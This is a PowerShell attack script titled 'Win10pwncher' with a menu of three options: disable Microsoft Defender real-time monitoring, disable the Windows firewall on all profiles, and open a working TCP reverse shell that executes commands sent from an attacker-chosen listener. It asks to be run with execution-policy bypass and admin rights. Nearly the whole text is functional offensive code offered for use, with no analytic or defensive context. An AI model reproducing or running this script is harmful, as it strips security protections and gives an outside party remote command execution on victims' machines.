
echo ' __      __.__       ___________                             .__                   
/  \    /  \__| ____/_   \   _  \ ______  __ __  ____   ____ |  |__   ___________  
\   \/\/   /  |/    \|   /  /_\  \\____ \|  |  \/    \_/ ___\|  |  \_/ __ \_  __ \ 
 \        /|  |   |  \   \  \_/   \  |_> >  |  /   |  \  \___|   Y  \  ___/|  | \/ 
  \__/\  / |__|___|  /___|\_____  /   __/|____/|___|  /\___  >___|  /\___  >__|    
       \/          \/           \/|__|              \/     \/     \/     \/        

'
echo 'Run powershell.exe -exec bypass. Admin rights required'
echo '1. For disable MSDefender'
echo '2. For disable Win10FireWall'
echo '3. For reverse shellBetaV0.5'
echo '4. For exit'
while(($inp = Read-Host -Prompt "Select a command") -ne "4"){
switch($inp){
   1 {"MSDefender disabled, restart your PC";Set-MpPreference -DisableRealtimeMonitoring $true}
   2 {"FireWall disabled";Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False}
   3 {$ip=read-host -prompt "Enter lissener ip";$port=read-host -prompt "Enter port number";
		$client = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	}
   4 {"Exit"}
   default {"Invalid entry"}
   }
}